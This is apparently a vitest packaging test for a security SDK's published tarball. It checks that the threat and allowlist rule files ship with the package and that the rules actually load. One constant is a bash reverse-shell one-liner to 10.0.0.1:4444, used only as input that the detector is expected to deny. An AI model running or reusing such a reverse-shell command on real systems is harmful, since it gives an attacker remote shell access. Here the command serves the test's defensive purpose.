/**
 * Packaging test for AIDR-018: the SDK must work from its published tarball.
 *
 * This is the test that would have caught the defect. Before the fix the tarball
 * shipped only `dist/**`, `init()` loaded cwd-relative `"threats"` / `"allowlists"`
 * paths, and a real consumer's `init()` threw — after which the fail-closed
 * enforcement turned every `check()` into the safe `ask` fallback, so a packaged
 * install detected nothing at all and answered "ask" forever.
 *
 * What this test does, for real:
 *
 *   1. `pnpm pack` the SDK (and core) into a temp directory — the actual tarball
 *      the release publishes, produced by the actual `prepack`/`files` config.
 *   2. Extracts the tarballs into `<tmp>/node_modules/@singularityrd/...` — an
 *      installed layout outside the monorepo, with the cwd set to the consumer
 *      directory, so nothing can resolve through the repository.
 *   3. Runs a consumer script with `node` against BOTH entry points
 *      (`dist/index.mjs` via `import`, `dist/index.cjs` via `require`) and asserts
 *      `init()` succeeds, a known-malicious command is `deny`ed (proof the rules
 *      really loaded) and a benign command is `allow`ed.
 *   4. Repeats the run against a `dist`-only extraction (the old, broken shape)
 *      and asserts `init()` fails with an explicit error naming the searched
 *      paths instead of "succeeding" and detecting nothing.
 *
 * Not covered here: a real `npm install` from the GitHub Packages registry (the
 * packages are published to a restricted registry this environment cannot reach).
 * Core is substituted with the locally packed tarball of the same version, which
 * is what the registry install would resolve `@singularityrd/aidr-core@0.6.0` to;
 * its runtime dependencies are linked from the workspace's installed tree.
 */

import { execFileSync, execSync } from "node:child_process";
import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	realpathSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

const TEST_DIR = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(TEST_DIR, "..", "..", "..", "..");
const SDK_DIR = resolve(REPO_ROOT, "packages", "sdk");
const CORE_DIR = resolve(REPO_ROOT, "packages", "core");

const MALICIOUS_COMMAND = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
const BENIGN_COMMAND = "ls -la /tmp";

const REQUIRED_SDK_ARTIFACTS = [
	join("dist", "index.mjs"),
	join("dist", "index.cjs"),
	join("resources", "threats"),
	join("resources", "allowlists"),
];

interface ConsumerResult {
	cwd: string;
	resolvedEntry: string;
	dataDirs: {
		threatsDir: string;
		allowlistsDir: string;
		sources: Record<string, string>;
	};
	malicious: { allowed: boolean; decision: string; threatId?: string };
	benign: { allowed: boolean; decision: string };
}

let workDir: string;
let consumerDir: string;
let sdkInstallDir: string;
let sdkTarballPath: string;
let esmResult: ConsumerResult;
let cjsResult: ConsumerResult;
let missingAssets: { status: number | null; stdout: string; stderr: string };

/** Build the SDK (and report clearly) if the artifacts under test are absent. */
function ensureArtifacts(): void {
	const missing = REQUIRED_SDK_ARTIFACTS.filter((rel) => !existsSync(join(SDK_DIR, rel)));
	if (missing.length > 0) {
		execSync("pnpm run build", { cwd: SDK_DIR, stdio: "inherit" });
	}

	const stillMissing = REQUIRED_SDK_ARTIFACTS.filter((rel) => !existsSync(join(SDK_DIR, rel)));
	if (stillMissing.length > 0) {
		throw new Error(
			`packaging test requires a built SDK; missing after build: ${stillMissing.join(", ")} (in ${SDK_DIR})`,
		);
	}
	if (!existsSync(join(CORE_DIR, "dist", "index.js"))) {
		throw new Error(
			`packaging test requires a built core package at ${CORE_DIR}/dist (run \`pnpm build\` first)`,
		);
	}
}

let pnpmVersionCache: string | undefined;

/**
 * Environment for `pnpm pack`.
 *
 * `pnpm pack` runs the package's `prepack` guard, which tells pnpm and npm apart
 * by `npm_config_user_agent`. A test run started through `npx` exports npm's user
 * agent — in upper case, and Windows environment variables are case-insensitive,
 * so it shadows any lower-case value we add — and `pnpm pack` passes it straight
 * through to the lifecycle script. The guard then misfires ("unresolved
 * workspace: references") even though the packer really is pnpm, which is exactly
 * what resolves those refs. Declare the packer truthfully (the assertion on the
 * packed manifest below proves the refs were resolved) instead of skipping the
 * guard with `--ignore-scripts`.
 */
function packEnvironment(): NodeJS.ProcessEnv {
	const env: NodeJS.ProcessEnv = { ...process.env };
	for (const key of Object.keys(env)) {
		if (key.toLowerCase() === "npm_config_user_agent") delete env[key];
	}
	pnpmVersionCache ??= execSync("pnpm --version", { encoding: "utf8" }).trim();
	env.npm_config_user_agent = `pnpm/${pnpmVersionCache} npm/? node/${process.version} ${process.platform} ${process.arch}`;
	return env;
}

/** `pnpm pack` a package into `destDir` and return the tarball path. */
function pack(packageDir: string, destDir: string): string {
	const before = new Set(readdirSync(destDir));
	execSync(`pnpm pack --pack-destination "${destDir}"`, {
		cwd: packageDir,
		stdio: "pipe",
		env: packEnvironment(),
	});
	const created = readdirSync(destDir).filter(
		(entry) => entry.endsWith(".tgz") && !before.has(entry),
	);
	if (created.length !== 1) {
		throw new Error(
			`expected exactly one tarball from ${packageDir}, got: ${created.join(", ") || "(none)"}`,
		);
	}
	return join(destDir, created[0] as string);
}

/** Extract a tarball into `destDir`, flattening the tarball's `package/` prefix. */
function extract(tarball: string, destDir: string): void {
	mkdirSync(destDir, { recursive: true });
	execSync(`tar -xzf "${tarball}" -C "${destDir}" --strip-components=1`, { stdio: "pipe" });
	if (!existsSync(join(destDir, "package.json"))) {
		throw new Error(`extraction of ${basename(tarball)} produced no package.json in ${destDir}`);
	}
}

/**
 * Link a package's installed runtime dependencies (core is ESM and keeps `yaml`,
 * `zod`, ... external; a registry install would provide them).
 */
function linkRuntimeDeps(sourceNodeModules: string, targetNodeModules: string): void {
	if (!existsSync(sourceNodeModules)) return;
	for (const entry of readdirSync(sourceNodeModules)) {
		if (entry.startsWith(".")) continue;
		const target = join(targetNodeModules, entry);
		if (existsSync(target)) continue;
		symlinkSync(realpathSync(join(sourceNodeModules, entry)), target, "junction");
	}
}

function runConsumer(scriptPath: string, cwd: string): ConsumerResult {
	const stdout = execFileSync(process.execPath, [scriptPath], {
		cwd,
		encoding: "utf8",
		env: { ...process.env, AIDR_THREATS_DIR: "", AIDR_ALLOWLISTS_DIR: "" },
	});
	return JSON.parse(stdout) as ConsumerResult;
}

const CONSUMER_OPTIONS = `{ apiKey: "packaging-test", timeout: 5000, retries: 0, cache: false, cacheTtl: 300000, environment: "production" }`;

const CONSUMER_BODY = `
	const client = new AIDRClient(${CONSUMER_OPTIONS});
	await client.init();
	const dataDirs = client.getDataDirs();
	const malicious = await client.check({ action: "execute", resource: ${JSON.stringify(MALICIOUS_COMMAND)} });
	const benign = await client.check({ action: "execute", resource: ${JSON.stringify(BENIGN_COMMAND)} });
	client.dispose();
	return { cwd: process.cwd(), resolvedEntry: ENTRY, dataDirs, malicious, benign };
`;

const ESM_CONSUMER = `
import { AIDRClient } from "@singularityrd/aidr-sdk";
const ENTRY = import.meta.resolve("@singularityrd/aidr-sdk");
const result = await (async () => {${CONSUMER_BODY}})();
console.log(JSON.stringify(result));
`;

const CJS_CONSUMER = `
const { AIDRClient } = require("@singularityrd/aidr-sdk");
const ENTRY = require.resolve("@singularityrd/aidr-sdk");
(async () => {
	const result = await (async () => {${CONSUMER_BODY}})();
	console.log(JSON.stringify(result));
})().catch((error) => {
	console.error("CONSUMER_FAILED: " + (error && error.stack ? error.stack : String(error)));
	process.exit(4);
});
`;

/** The old, broken shape: dist only, no resources. Must fail loudly. */
const MISSING_ASSETS_CONSUMER = `
const { AIDRClient } = require("@singularityrd/aidr-sdk");
(async () => {
	const client = new AIDRClient(${CONSUMER_OPTIONS});
	await client.init();
	// Reaching this line means a packaged install with no rules "succeeded".
	console.log("INIT-SUCCEEDED-WITHOUT-RULES");
	const result = await client.check({ action: "execute", resource: ${JSON.stringify(BENIGN_COMMAND)} });
	console.log("CHECK-RESULT:" + JSON.stringify(result));
})().catch((error) => {
	console.error("INIT_FAILED:" + error.name + ": " + error.message);
	process.exit(3);
});
`;

beforeAll(() => {
	ensureArtifacts();

	workDir = mkdtempSync(join(tmpdir(), "aidr-sdk-packaging-"));
	const tarballDir = join(workDir, "tarballs");
	consumerDir = join(workDir, "consumer");
	mkdirSync(tarballDir, { recursive: true });
	mkdirSync(consumerDir, { recursive: true });

	const scopeDir = join(consumerDir, "node_modules", "@singularityrd");
	mkdirSync(scopeDir, { recursive: true });

	// 1. Pack and extract the real tarballs into an installed layout.
	sdkTarballPath = pack(SDK_DIR, tarballDir);
	const coreTarball = pack(CORE_DIR, tarballDir);
	sdkInstallDir = join(scopeDir, "aidr-sdk");
	extract(sdkTarballPath, sdkInstallDir);
	extract(coreTarball, join(scopeDir, "aidr-core"));
	linkRuntimeDeps(join(CORE_DIR, "node_modules"), join(consumerDir, "node_modules"));

	// 2. Run both entry points from the consumer directory (cwd outside the repo).
	const esmScript = join(consumerDir, "consumer.mjs");
	const cjsScript = join(consumerDir, "consumer.cjs");
	writeFileSync(esmScript, ESM_CONSUMER);
	writeFileSync(cjsScript, CJS_CONSUMER);
	esmResult = runConsumer(esmScript, consumerDir);
	cjsResult = runConsumer(cjsScript, consumerDir);

	// 3. The old tarball shape (dist only) must fail loudly, not silently.
	const brokenDir = join(workDir, "consumer-missing-assets");
	const brokenInstall = join(brokenDir, "node_modules", "@singularityrd", "aidr-sdk");
	mkdirSync(brokenInstall, { recursive: true });
	extract(sdkTarballPath, brokenInstall);
	// Reduce it to the old dist-only shape this defect shipped.
	rmSync(join(brokenInstall, "resources"), { recursive: true, force: true });
	const brokenScript = join(brokenDir, "consumer.cjs");
	writeFileSync(brokenScript, MISSING_ASSETS_CONSUMER);
	try {
		const stdout = execFileSync(process.execPath, [brokenScript], {
			cwd: brokenDir,
			encoding: "utf8",
			stdio: ["ignore", "pipe", "pipe"],
			env: { ...process.env, AIDR_THREATS_DIR: "", AIDR_ALLOWLISTS_DIR: "" },
		});
		missingAssets = { status: 0, stdout, stderr: "" };
	} catch (error) {
		const failure = error as { status?: number; stdout?: string; stderr?: string };
		missingAssets = {
			status: failure.status ?? null,
			stdout: failure.stdout ?? "",
			stderr: failure.stderr ?? "",
		};
	}
}, 600_000);

afterAll(() => {
	if (workDir) rmSync(workDir, { recursive: true, force: true });
});

describe("packaged SDK tarball (installed outside the monorepo)", () => {
	it("ships the rule data next to dist/", () => {
		expect(existsSync(join(sdkInstallDir, "dist", "index.mjs"))).toBe(true);
		const threatsDir = join(sdkInstallDir, "resources", "threats");
		const allowlistsDir = join(sdkInstallDir, "resources", "allowlists");
		expect(existsSync(threatsDir)).toBe(true);
		expect(existsSync(allowlistsDir)).toBe(true);

		const threats = readdirSync(threatsDir).filter((entry) => entry.endsWith(".yaml"));
		expect(threats.length).toBeGreaterThan(20);
		// Evidence straight from the tarball's own file list.
		const listing = execFileSync("tar", ["-tzf", sdkTarballPath], { encoding: "utf8" });
		expect(listing).toContain("package/resources/threats/");
		expect(listing).toContain("package/resources/allowlists/");
		expect(listing).toContain("package/dist/index.mjs");
	});

	it("packs with workspace references resolved (installable dependency range)", () => {
		const manifest = JSON.parse(readFileSync(join(sdkInstallDir, "package.json"), "utf8")) as {
			dependencies?: Record<string, string>;
		};

		expect(manifest.dependencies?.["@singularityrd/aidr-core"]).toBeDefined();
		expect(manifest.dependencies?.["@singularityrd/aidr-core"]?.startsWith("workspace:")).toBe(
			false,
		);
	});

	it("resolves its rules from the install, not from the cwd (ESM entry)", () => {
		expect(esmResult.cwd).toBe(consumerDir);
		expect(esmResult.cwd.startsWith(REPO_ROOT)).toBe(false);
		expect(esmResult.resolvedEntry).toContain("index.mjs");
		expect(esmResult.dataDirs.sources).toEqual({ threats: "package", allowlists: "package" });
		expect(esmResult.dataDirs.threatsDir.startsWith(sdkInstallDir)).toBe(true);
		expect(esmResult.dataDirs.allowlistsDir.startsWith(sdkInstallDir)).toBe(true);
	});

	it("denies a known-malicious artifact and allows a benign one (ESM entry)", () => {
		expect(esmResult.malicious.decision).toBe("deny");
		expect(esmResult.malicious.allowed).toBe(false);
		expect(esmResult.malicious.threatId).toBeTruthy();
		expect(esmResult.benign.decision).toBe("allow");
		expect(esmResult.benign.allowed).toBe(true);
	});

	it("denies a known-malicious artifact and allows a benign one (CJS entry)", () => {
		expect(cjsResult.cwd).toBe(consumerDir);
		expect(cjsResult.resolvedEntry).toContain("index.cjs");
		expect(cjsResult.malicious.decision).toBe("deny");
		expect(cjsResult.malicious.allowed).toBe(false);
		expect(cjsResult.benign.decision).toBe("allow");
		expect(cjsResult.benign.allowed).toBe(true);
	});
});

describe("packaged SDK with the rule data missing", () => {
	it("fails init() loudly instead of reporting a check result", () => {
		expect(missingAssets.status).not.toBe(0);
		expect(missingAssets.stdout).not.toContain("INIT-SUCCEEDED-WITHOUT-RULES");
		expect(missingAssets.stdout).not.toContain("CHECK-RESULT");
		expect(missingAssets.stderr).toContain("INIT_FAILED:AIDRDataDirError");
		expect(missingAssets.stderr).toContain('no usable "threats" directory');
		// The error names where it looked: the install's own resources dir.
		expect(missingAssets.stderr).toContain(join("aidr-sdk", "resources", "threats"));
	});
});
